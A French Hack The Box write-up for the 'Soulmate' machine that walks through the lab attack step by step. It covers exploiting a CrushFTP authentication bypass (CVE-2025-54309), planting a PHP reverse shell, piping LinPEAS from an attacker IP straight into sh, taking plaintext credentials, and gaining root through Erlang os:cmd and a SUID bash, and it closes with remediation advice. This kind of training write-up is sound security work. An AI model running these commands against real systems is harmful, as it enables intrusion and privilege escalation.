+++
draft = true
date = '2025-10-08T13:00:00+02:00'
title = "Hack The Box Soulmate"
description = "Write Up du challenge Soulmate"
authors = "Wanako"
tags = ["Hack The Box"]
categories = ["Machine", "Hack The Box", "CVE"]
+++

# Writeup - Soulmate HTB

## Reconnaissance

### Scan Nmap

```bash
nmap -A 10.10.11.86
```

**Résultats :**
- Port 22 : SSH (OpenSSH 8.9p1 Ubuntu)
- Port 80 : HTTP (nginx 1.18.0)
- Hostname identifié : `soulmate.htb`

### Énumération des sous-domaines

```bash
gobuster vhost -w ~/ctf/03_tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
               -u http://soulmate.htb \
               --append-domain
```

**Découverte :** `ftp.soulmate.htb` (redirection vers `/WebInterface/login.html`)

> 💡 **Note :** Cette syntaxe de Gobuster est préférable car elle n'utilise pas de résolution DNS et teste directement les vhosts via l'en-tête Host.

Ajout dans `/etc/hosts` :
```
10.10.11.86 soulmate.htb ftp.soulmate.htb
```

---

## Exploitation - CVE-2025-54309 (CrushFTP)

### Identification de la cible

Sur `http://ftp.soulmate.htb`, on découvre **CrushFTP** :
- Version : `11.W.657-2025_03_08_07_52` (build du 8 mars 2025)
- Vulnérable à **CVE-2025-54309** (CRITIQUE)

**Détails de la vulnérabilité :**
- Affecte les versions < 10.8.5 et < 11.3.4_23
- Race condition permettant un bypass d'authentification via l'exploitation d'une mauvaise validation AS2
- Permet l'accès admin via HTTPS/HTTP

### Reconnaissance avec l'outil watchTowr

```bash
python watchTowr-vs-CrushFTP-CVE-2025-54309.py http://ftp.soulmate.htb
```

**Résultat :**
```
[*] VULNERABLE! RACE CONDITION POSSIBLE!
[*] EXFILTRATED 5 USERS: ben, crushadmin, default, jenna, TempAccount
```

### Exploitation - Création d'un utilisateur admin

```bash
python exploit.py http://ftp.soulmate.htb
```

**Résultat :**
```
[+] SUCCESS! User 'htbadmin' created successfully!
[+] Admin user created: htbadmin:HTBPassword123!
```

**Connexion :** `http://ftp.soulmate.htb/WebInterface/`
- Username : `htbadmin`
- Password : `HTBPassword123!`

---

## Accès initial (www-data)

### Modification du mot de passe de Ben

Dans l'interface CrushFTP, nous avons les privilèges pour modifier les mots de passe des utilisateurs. On découvre que **Ben** a accès au site principal et dispose d'un fichier `shell.php`.

### Reverse shell

1. **Préparation du payload :**
   - Téléchargement de MonkeyShell (ou tout autre reverse shell PHP)
   - Renommage en `shell.php`
   - Configuration : IP attaquant + port 4444

2. **Upload via CrushFTP** (en tant que Ben)

3. **Déclenchement :**
   ```bash
   nc -lvnp 4444
   curl http://soulmate.htb/shell.php
   ```

4. **Stabilisation du shell :**
   ```bash
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```

**Shell obtenu :** `www-data@soulmate:~/soulmate.htb/config`

---

## Élévation de privilèges (www-data → ben)

### Extraction de la base de données

Dans `config.php` :
```php
private $db_file = '../data/soulmate.db';
```

**Exfiltration :**
```bash
cp data/soulmate.db public/
```

Téléchargement via navigateur : `http://soulmate.htb/soulmate.db`

### Analyse de la base de données

Ouverture avec un outil SQLite en ligne :

```sql
SELECT * FROM users;
```

**Résultat :**
```
id: 1
username: admin
password: $2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2
is_admin: 1
```

> ℹ️ Hash bcrypt difficile à cracker, on continue l'énumération.

### Énumération avec LinPEAS

**Déploiement :**
```bash
# Sur la machine attaquante :
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
python -m http.server 8080

# Sur la cible :
curl http://10.10.14.115:8080/linpeas.sh | sh
```

**Découverte clé :**
```
root  945  /usr/local/lib/erlang_login/start.escript
```

### Extraction des credentials

```bash
cat /usr/local/lib/erlang_login/start.escript
```

**Credentials trouvés :**
```erlang
{user_passwords, [{"ben", "HouseH0ldings998"}]},
```

### Qu'est-ce qu'Erlang ?

**Erlang** est un langage de programmation fonctionnel développé par Ericsson, principalement utilisé pour :
- Les systèmes distribués et tolérants aux pannes
- Les télécommunications
- Les systèmes temps réel

Dans ce contexte, Erlang gère l'authentification SSH via un script `.escript` (script Erlang exécutable). Le service tourne en root et écoute sur le port **2222** localement.

### Connexion SSH

```bash
ssh ben@soulmate.htb
```

Password : `HouseH0ldings998`

**Flag user :**
```bash
cat ~/user.txt
```

---

## Élévation de privilèges (ben → root)

### Exploitation du service Erlang

Le service `/usr/local/lib/erlang_login/start.escript` tourne en **root** et expose un shell Erlang interactif.

### Méthode 1 : Via SUID bit

1. **Connexion au service Erlang (port 2222) :**
   ```bash
   ssh ben@127.0.0.1 -p 2222
   ```

2. **Prompt Erlang obtenu :** `(ssh_runner@soulmate)1>`

3. **Ajout du bit SUID à /bin/bash :**
   ```erlang
   os:cmd("/bin/bash -c 'chmod u+s /bin/bash'").
   ```

4. **Dans un autre terminal SSH (en tant que ben) :**
   ```bash
   /bin/bash -p
   ```

5. **Root obtenu :**
   ```bash
   cat /root/root.txt
   # 1181db740888adc04910d2e7cb46a364
   ```

### Méthode 2 : Exécution directe

Depuis le shell Erlang :

```erlang
os:cmd("id").
# "uid=0(root) gid=0(root) groups=0(root)\n"

os:cmd("cat /root/root.txt").
# "1181db740888adc04910d2e7cb46a364\n"
```

---

## Timeline de l'attaque

```
1. Nmap → Découverte de soulmate.htb
2. Gobuster vhost → ftp.soulmate.htb (CrushFTP)
3. CVE-2025-54309 → Création admin (htbadmin)
4. CrushFTP → Upload shell.php (utilisateur Ben)
5. Reverse shell → www-data
6. Exfiltration soulmate.db → Échec (hash bcrypt)
7. LinPEAS → Découverte Erlang service
8. start.escript → Credentials de Ben
9. SSH ben@soulmate.htb → user.txt
10. SSH ben@127.0.0.1:2222 → Shell Erlang (root)
11. os:cmd() → Élévation root → root.txt
```

---

## Flags

- **User flag :** `[dans /home/ben/user.txt]`
- **Root flag :** `1181db740888adc04910d2e7cb46a364`

---

## Remédiation

1. **Mettre à jour CrushFTP** → Version ≥ 11.3.4_23
2. **Ne pas stocker de credentials en clair** dans les scripts
3. **Principe du moindre privilège** : Le service Erlang ne devrait pas tourner en root
4. **Limiter l'accès SSH** au port 2222 (localhost uniquement + firewall)
5. **Audit des permissions** : Pas de `os:cmd()` accessible sans validation

---

## Outils utilisés

- `nmap`, `gobuster`
- `watchTowr-vs-CrushFTP-CVE-2025-54309.py`
- `MonkeyShell` (reverse shell PHP)
- `LinPEAS`
- Client SSH

---

**Box owned! 🎉**
